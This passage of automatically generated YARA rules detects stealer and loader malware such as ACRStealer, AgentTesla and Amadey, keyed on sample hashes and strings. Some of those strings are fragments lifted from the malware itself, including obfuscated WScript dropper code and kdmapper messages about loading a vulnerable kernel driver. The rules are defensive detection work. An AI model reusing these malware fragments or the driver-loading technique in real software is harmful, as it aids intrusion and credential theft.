      $s3 = "f=WScript[_0x27bd42(0x1fc)](_0x27bd42(0x15f));_0x422b7f[_0x27bd42(0x162)]=_0x26667f,_0x422b7f[_0x27bd42(0x18f)]=_0x27bd42(0x1fe)" ascii /* score: '10.00'*/
      $s4 = "WScript[_0x22432a(0x1fc)](_0x2d0f14(0xb2));_0xdf0e4a[_0x22432a(0x162)]=_0x1da4ff,_0xdf0e4a[_0x22432a(0x18f)]=_0x22432a(0x1fe),_0" ascii /* score: '10.00'*/
      $s5 = "302425,0x10);},this[_0xba7f9c(0x14b)]=function(_0x5ef149){var _0x4851eb=_0x57b492,_0xb927f7=_0xba7f9c,_0x5be000=WScript[_0x4851e" ascii /* score: '10.00'*/
      $s6 = "2d(0x204)]=function(){var _0x5f4dee=_0xd2d4a1,_0x4d6db9=_0x1ceb2d,_0x563f56=WScript[_0x4d6db9(0x1fc)](_0x4d6db9(0x15f));_0x563f5" ascii /* score: '10.00'*/
      $s7 = "568,_0x343bfe=WScript[_0x124184(0x1fc)](_0x124184(0x15f));_0x343bfe[_0x124184(0x162)]=_0x3562ea,_0x343bfe[_0x4f28d9(0x162)]=_0x3" ascii /* score: '10.00'*/
      $s8 = "{var _0x580c7=_0x54c0fc,_0x207722=WScript[_0x580c7(0x22f)](_0x580c7(0x256));_0x207722[_0x580c7(0x21a)]=_0x866f56,_0x207722[_0x58" ascii /* score: '10.00'*/
      $s9 = "x1bc773){var _0x4844a2=_0x1ac6bd,_0x187ecf=WScript[_0x4844a2(0x1fc)](_0x4844a2(0x15f));_0x187ecf[_0x4844a2(0x162)]=_0x141894,_0x" ascii /* score: '10.00'*/
      $s10 = "1ee1fc=_0x5b3014,_0x3a66de=WScript[_0x1ee1fc(0x1e9)](_0x1ee1fc(0x238));_0x3a66de[_0x1ee1fc(0x25f)]=_0x5bd989,_0x3a66de[_0x1ee1fc" ascii /* score: '10.00'*/
      $s11 = "8e)]();},this[_0x2f7344(0x1af)]=function(){var _0x41a270=_0x2f7344,_0x249d80=_0x529b24,_0x8bf38=WScript[_0x249d80(0x1fc)](_0x249" ascii /* score: '10.00'*/
      $s12 = "function(){var _0x547fdb=_0xe39b4e,_0x4201b6=WScript[_0x547fdb(0x1fc)](_0x547fdb(0x15f));_0x4201b6['Type']=_0x5df49d,_0x4201b6['" ascii /* score: '10.00'*/
      $s13 = "d795,_0x1fae0b=_0x4a3829,_0x5d5fb3=WScript[_0x1fae0b(0x1fc)](_0x1fae0b(0x15f));_0x5d5fb3[_0x1fae0b(0x162)]=_0x2b750d,_0x5d5fb3[_" ascii /* score: '10.00'*/
      $s14 = "x42575d){return parseInt(_0x42575d,0x10);},this[_0x2b8bbd(0x288)]=function(_0x1f6c94){var _0x48df96=_0x2b8bbd,_0x24e5e1=WScript[" ascii /* score: '10.00'*/
      $s15 = "){var _0x544bde=_0x47e311,_0x5adc2c=_0x4c16b9,_0x329ef1=WScript[_0x5adc2c(0x1fc)](_0x5adc2c(0x15f));_0x329ef1[_0x5adc2c(0x162)]=" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__3bd2d790_ACRStealer_signature__e1bed102_2 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_3bd2d790.zip, ACRStealer(signature)_e1bed102.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3bd2d79089c5ca17b978003c98f765f3d3a87a4a3d1c55bbe02ddc99ec3e9c4c"
      hash2 = "e1bed102242bf5308d02fc59209b944f45d633cf2b4f2d6597d0b9ddcc8048ba"
   strings:
      $s1 = "SoftwareLog.dll" fullword ascii /* score: '28.00'*/
      $s2 = "FileReportEx.dll" fullword ascii /* score: '26.00'*/
      $s3 = "vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s4 = "BugSplat64.dll" fullword ascii /* score: '23.00'*/
      $s5 = "libssl-1_1-x64.dll" fullword ascii /* score: '20.00'*/
      $s6 = "git2-a418d9d.dll" fullword ascii /* score: '17.00'*/
      $s7 = "UpdateClient.prx" fullword ascii /* score: '10.00'*/
      $s8 = "Feng.xfn" fullword ascii /* score: '10.00'*/
      $s9 = "qzPdllLp " fullword ascii /* score: '9.00'*/
      $s10 = "?7 7./!/)/%/-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'w' */
      $s11 = "* 5NIA" fullword ascii /* score: '9.00'*/
      $s12 = "7' '*'!'E=;" fullword ascii /* score: '9.00'*/ /* hex encoded string '~' */
      $s13 = "okghgjgigk" fullword ascii /* score: '8.00'*/
      $s14 = "gvggwggggf" fullword ascii /* score: '8.00'*/
      $s15 = "xhxjfxj" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__1af7c920_AgentTesla_signature__1d349c2a_3 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_1af7c920.js, AgentTesla(signature)_1d349c2a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1af7c920929c3b71bdba26c751768f43106104ed7cdb48197ac2f8a15cc5d774"
      hash2 = "1d349c2a4412e871fcbee2ab6a9130513be6d73c187c8d01d53fd02cb9355396"
   strings:
      $s1 = "//Execrating konkursbegring; apostroferet! absents:" fullword ascii /* score: '21.00'*/
      $s2 = "var Processor = -59680;" fullword ascii /* score: '19.00'*/
      $s3 = "var dumpedes = 0xFFFF7BBC;" fullword ascii /* score: '18.00'*/
      $s4 = "var Geninstaller = \"Executer? efterslb\";" fullword ascii /* score: '18.00'*/
      $s5 = "//Alrunes, palilogetic? gryntet" fullword ascii /* score: '17.00'*/
      $s6 = "//Klagetemaet126. imagescanning: pneumatochemical, carabini, opgavesamlinger" fullword ascii /* score: '17.00'*/
      $s7 = "Comiferouspigletsluppe = Comiferouspigletsluppe - 5494449;" fullword ascii /* score: '17.00'*/
      $s8 = "//Ugestemplende: nonimperialistic: mediaevalise? bevgeapparat" fullword ascii /* score: '16.00'*/
      $s9 = "//Islndingeres: videresalgsmulighed aldringsprocessers!" fullword ascii /* score: '15.00'*/
      $s10 = "Riverhead.pop();" fullword ascii /* score: '15.00'*/
      $s11 = "//Tracheochromatic. tapetserere illiberalness3. annekteringen25! glemmeprocessers" fullword ascii /* score: '15.00'*/
      $s12 = "//Perissodactylic reportingly topopolitan telefonsystem, varetaget:" fullword ascii /* score: '15.00'*/
      $s13 = "//Fritsas: terminalprocessernes, brugtbaadenes: barauna; benzinkrig:" fullword ascii /* score: '15.00'*/
      $s14 = "//Unventurous. transplantationsdonorernes, udmnstredes; baggrundsprocessers, seroperitoneum?" fullword ascii /* score: '15.00'*/
      $s15 = "//Monkeyry: soapiest; kombinatorisk; lordofevil:" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__b039c588c74493feceed91f3303659a5_imphash__ACRStealer_signature__b039c588c74493feceed91f3303659a5_imph_4 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_b039c588c74493feceed91f3303659a5(imphash).dll, ACRStealer(signature)_b039c588c74493feceed91f3303659a5(imphash)_2cc09107.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "26621ab2d6aade65fbb7427e3cc08cd95a291f645f55843d38a79e7de34c818f"
      hash2 = "2cc091073c26db0b8701fcc383f588c4bf75f1221059a3d339bd6f958d0624f1"
   strings:
      $x1 = "C:\\Users\\qt\\work\\qt\\qtbase\\lib\\Qt5Network.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "QHttpNetworkConnectionPrivate::_q_hostLookupFinished could not de-queue request, failed to report HostNotFoundError" fullword ascii /* score: '18.00'*/
      $s3 = "Failed to generate cookie - invalid (nullptr) parameter(s)" fullword ascii /* score: '18.00'*/
      $s4 = "?resolveProxy@QTcpServerPrivate@@QAE?AVQNetworkProxy@@ABVQHostAddress@@G@Z" fullword ascii /* score: '18.00'*/
      $s5 = "QSslSocket::connectToHostEncrypted: TLS initialization failed" fullword ascii /* score: '17.00'*/
      $s6 = "?connectToHostEncrypted@QNetworkAccessManager@@QAEXABVQString@@GABVQSslConfiguration@@0@Z" fullword ascii /* score: '17.00'*/
      $s7 = "n204 No Content301 Moved Permanently400 Bad Request401 Unauthorized403 Forbidden404 Not Found500 Internal Server Error501 Not Im" ascii /* score: '17.00'*/
      $s8 = "Error transferring %1 - server replied: %2" fullword ascii /* score: '15.00'*/
      $s9 = "2processedData(qint64,qint64)" fullword ascii /* score: '15.00'*/
      $s10 = "?isEqual@QHostAddress@@QBE_NABV1@V?$QFlags@W4ConversionModeFlag@QHostAddress@@@@@Z" fullword ascii /* score: '15.00'*/
      $s11 = "?deriveKeyPbkdf2@QPasswordDigestor@@YA?AVQByteArray@@W4Algorithm@QCryptographicHash@@ABV2@1H_K@Z" fullword ascii /* score: '15.00'*/
      $s12 = "QNetworkAccessFtpBackend: HELP command failed, ignoring it" fullword ascii /* score: '15.00'*/
      $s13 = "??0QMutex@@QAE@XZ" fullword ascii /* score: '15.00'*/
      $s14 = "?current@QOperatingSystemVersion@@SA?AV1@XZ" fullword ascii /* score: '15.00'*/
      $s15 = "failed to send HEADERS frame(s)" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "b039c588c74493feceed91f3303659a5" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bb_5 {
   meta:
      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash3 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash4 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash5 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $x1 = "x509: invalid signature: parent certificate cannot sign this kind of certificatex509: a root or intermediate certificate is not " ascii /* score: '72.50'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)runtime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii /* score: '70.50'*/
      $x3 = " [failed to parse Location header %q: %vnet/http: invalid header field name %qtls: invalid ServerKeyExchange messageexpected an " ascii /* score: '66.50'*/
      $x4 = "x509: cannot verify signature: algorithm unimplementedx509: invalid RDNSequence: invalid attribute value: %sURI with IP (%q) can" ascii /* score: '54.00'*/
      $x5 = "span set block with unpopped elements found in resetcasfrom_Gscanstatus: gp->status is not in scan statecrypto/rsa: PSSOptions.S" ascii /* score: '51.50'*/
      $x6 = "sched={pc:, gp->status= pluginpath= : unknown pc  called from  in host nameSHA256-RSAPSSSHA384-RSAPSSSHA512-RSAPSStrailing dataS" ascii /* score: '51.00'*/
      $x7 = "net/url: invalid control character in URLcan't call pointer on a non-pointer Valuereflect.Value.Addr of unaddressable valueMapIt" ascii /* score: '41.50'*/
      $x8 = "/usr/lib/libgdi.so.0.8.2/etc/profile.d/gateway.shhttp2: Request.URI is nilhttp2: Framer %p: read %vframe_data_pad_byte_shortfram" ascii /* score: '38.50'*/
      $x9 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=method ABI and value" ascii /* score: '37.00'*/
      $x10 = "error in parseTagAndLengthmix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLengt" ascii /* score: '36.50'*/
      $x11 = " [unexpected CONTINUATION for stream %dbytes.Buffer: truncation out of rangeRoundTrip on uninitialized ClientConntls: unsupporte" ascii /* score: '36.00'*/
      $x12 = "  consultationcommunity ofthe nationalit should beparticipants align=\"leftthe greatestselection ofsupernaturaldependent onis me" ascii /* score: '35.00'*/
      $x13 = "http: no Host in request URLEd25519 verification failureMultiple padding extensions!18189894035458564758300781259094947017729282" ascii /* score: '33.00'*/
      $x14 = "recursive call during initialization - linker skewattempt to execute system stack code on user stackx509: missing ASN.1 contents" ascii /* score: '33.00'*/
      $x15 = "os/exec.Command(exec: killing Cmdexec: not startedunknown type kindreflect.Value.Intreflect: call of reflect.Value.Lenreflect: N" ascii /* score: '32.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _8059e25d7b32449cfecfb5f0a2169a65_imphash__ACRStealer_signature__6faee67a691b5510cdbffa2f65fadb6a_imphash__6 {
   meta:
      description = "_subset_batch - from files 8059e25d7b32449cfecfb5f0a2169a65(imphash).exe, ACRStealer(signature)_6faee67a691b5510cdbffa2f65fadb6a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2d04c70f3bcf3e4f8fda71c3050e3f8a457bf47da11375b564fa0a78ff172d3f"
      hash2 = "30496079ebff4b88222a5d91611c8a7a8be8d86f9abd83814285db371b9b63df"
   strings:
      $s1 = "CTLOG_get0_public_key" fullword ascii /* score: '20.00'*/
      $s2 = "OSSL_STORE_LOADER_get0_engine" fullword ascii /* score: '18.00'*/
      $s3 = "OSSL_STORE_LOADER_get0_scheme" fullword ascii /* score: '18.00'*/
      $s4 = "EVP_PKEY_meth_get_encrypt" fullword ascii /* score: '17.00'*/
      $s5 = "X509_get_extended_key_usage" fullword ascii /* score: '17.00'*/
      $s6 = "EVP_PKEY_get1_tls_encodedpoint" fullword ascii /* score: '17.00'*/
      $s7 = "OSSL_STORE_LOADER_set_error" fullword ascii /* score: '16.00'*/
      $s8 = "ASN1_SCTX_get_template" fullword ascii /* score: '16.00'*/
      $s9 = "OSSL_STORE_INFO_get0_NAME_description" fullword ascii /* score: '15.00'*/
      $s10 = "OSSL_STORE_INFO_get1_NAME_description" fullword ascii /* score: '15.00'*/
      $s11 = "X509_get0_authority_key_id" fullword ascii /* score: '15.00'*/
      $s12 = "PKCS12 import password" fullword ascii /* score: '15.00'*/
      $s13 = "EVP_PKEY_get_raw_public_key" fullword ascii /* score: '15.00'*/
      $s14 = "EVP_PKEY_get0_siphash" fullword ascii /* score: '15.00'*/
      $s15 = "EVP_PKEY_meth_get_public_check" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ec_7 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash6 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s2 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s3 = "syscall.forkExecPipe" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s5 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s6 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s7 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s8 = "runtime: bad notifyList size - sync=signal arrived during cgo execution" fullword ascii /* score: '20.00'*/
      $s9 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s10 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s11 = "*func(*exec.Cmd)" fullword ascii /* score: '20.00'*/
      $s12 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s13 = ".attempts int; net.rotate bool; net.unknownOpt bool; net.lookup []string; net.err error; net.mtime time.Time; net.soffset uint32" ascii /* score: '20.00'*/
      $s14 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s15 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8059e25d7b32449cfecfb5f0a2169a65_imphash__91f8b1bbcbf11338d823d9d6c8c7e089_imphash__ACRStealer_signature__6faee67a691b5510c_8 {
   meta:
      description = "_subset_batch - from files 8059e25d7b32449cfecfb5f0a2169a65(imphash).exe, 91f8b1bbcbf11338d823d9d6c8c7e089(imphash).exe, ACRStealer(signature)_6faee67a691b5510cdbffa2f65fadb6a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2d04c70f3bcf3e4f8fda71c3050e3f8a457bf47da11375b564fa0a78ff172d3f"
      hash2 = "403e0c40a6eca112766379d8d1dd31dde3919d992f9f78b41f0e08fba440b4f5"
      hash3 = "30496079ebff4b88222a5d91611c8a7a8be8d86f9abd83814285db371b9b63df"
   strings:
      $s1 = "Private-Key: (%d bit, %d primes)" fullword ascii /* score: '13.00'*/
      $s2 = "%s:%d: OpenSSL internal error: %s" fullword ascii /* score: '12.50'*/
      $s3 = "\\(a8Bk" fullword ascii /* reversed goodware string 'kB8a(\\' */ /* score: '12.00'*/
      $s4 = "OSSL_STORE_INFO_get1_PKEY" fullword ascii /* score: '12.00'*/
      $s5 = "X509_PUBKEY_get0" fullword ascii /* score: '12.00'*/
      $s6 = "siphash" fullword ascii /* score: '11.00'*/
      $s7 = "hexpass" fullword ascii /* score: '11.00'*/
      $s8 = "hexsecret" fullword ascii /* score: '11.00'*/
      $s9 = " JJ5Jj" fullword ascii /* reversed goodware string 'jJ5JJ ' */ /* score: '11.00'*/
      $s10 = "%*s%s Private-Key:" fullword ascii /* score: '10.00'*/
      $s11 = "OSSL_STORE_INFO_set0_NAME_description" fullword ascii /* score: '10.00'*/
      $s12 = "assertion failed: keylen <= sizeof(key)" fullword ascii /* score: '10.00'*/
      $s13 = "%*s%s Public-Key:" fullword ascii /* score: '10.00'*/
      $s14 = "assertion failed: nkey <= EVP_MAX_KEY_LENGTH" fullword ascii /* score: '10.00'*/
      $s15 = "%*s<INVALID PRIVATE KEY>" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__1ff43e683b799b789_9 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash3 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash4 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
      hash5 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash6 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash7 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
      hash8 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $x1 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $x2 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x3 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $s4 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s5 = ":System.Private.TypeLoader.dll8System.Security.Cryptography" fullword ascii /* score: '28.00'*/
      $s6 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s7 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s8 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s10 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s14 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s15 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 12000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dffbd774_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_10 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dffbd774.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb7e6164.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "dffbd774b50dd2319bff54a998b59872b1a5a2b7dcab844e7e0e6d00bd428af3"
      hash2 = "fb7e616458509e23902258b7679d2c3959cee8ebf03f77d0a443828394f2057f"
   strings:
      $x1 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\objfre_wnet_AMD64\\amd64\\iqvw64e.pdb" fullword ascii /* score: '34.00'*/
      $x2 = "C:\\Users\\interpreter\\Documents\\Oracl\\kdmapper-master\\x64\\Release\\kdmapper.pdb" fullword ascii /* score: '33.00'*/
      $x3 = "\\SystemRoot\\Strawberry - serial.tmp" fullword wide /* score: '31.00'*/
      $x4 = "[-] Failed to get ntoskrnl.exe" fullword wide /* score: '31.00'*/
      $s5 = "[-] Failed to load driver iqvw64e.sys" fullword wide /* score: '29.00'*/
      $s6 = "[!] Error dumping shit inside the disk" fullword wide /* score: '29.00'*/
      $s7 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\windriverpci_i.c" fullword ascii /* score: '27.00'*/
      $s8 = "C:\\!PROGRAMS\\Programming\\Projects\\!Spoofer\\SpooferFN\\x64\\Release\\SpooferFN.pdb" fullword ascii /* score: '27.00'*/
      $s9 = "[-] Failed to load ntdll.dll" fullword wide /* score: '27.00'*/
      $s10 = "_NalWinGetUserAddress: Using memory map table slot %d - Length %d" fullword ascii /* score: '26.00'*/
      $s11 = "[-] Failed to register and start service for the vulnerable driver" fullword wide /* score: '26.00'*/
      $s12 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s13 = "Cheating.win Is Pasted  Level is big retard!  Dumped by Bucciarati#1337 / ZeraX hf & gl pasting" fullword ascii /* score: '24.00'*/
      $s14 = "Syntex Spoofer.exe" fullword wide /* score: '24.00'*/
      $s15 = "[-] Failed to get export ntdll.NtAddAtom" fullword wide /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__1895460fffad9475fda0c84755ecfee1_imphash__a3__Logger_signature__1895460fffad9475fda0c84755ecfee1_imph_11 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_1aa8a0d1.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b21399e4.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_231241bf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "75c3b61d489134e5295adf75aa0cb6aa6fd479d412e023666153c75bea9eaa1b"
      hash2 = "1aa8a0d186840fc2a6cf512d3064808b6ad405a12479842e93169bf479a0dc33"
      hash3 = "b21399e4283631c68a3e60d3f826df09815e8bbb50e1790b8266bad03f9b5b7d"
      hash4 = "f9c16f7eafbc4e39c2c6db784d206f6ab2c8ff81d9e8ecb5f278c923a0c550c2"
      hash5 = "231241bf7085015077370cd69dc1c85aa0c3ade473b6c41506c55242d2fbd1e9"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s4 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s5 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s6 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s9 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s10 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s11 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "0b768923437678ce375719e30b21693e" and ( 8 of them )
      ) or ( all of them )
}

rule _a41097d27d1b14962ff14afe46b2196d_imphash__Amadey_signature__1a41b236e54319b64f65b4f667766e1e_imphash__12 {
   meta:
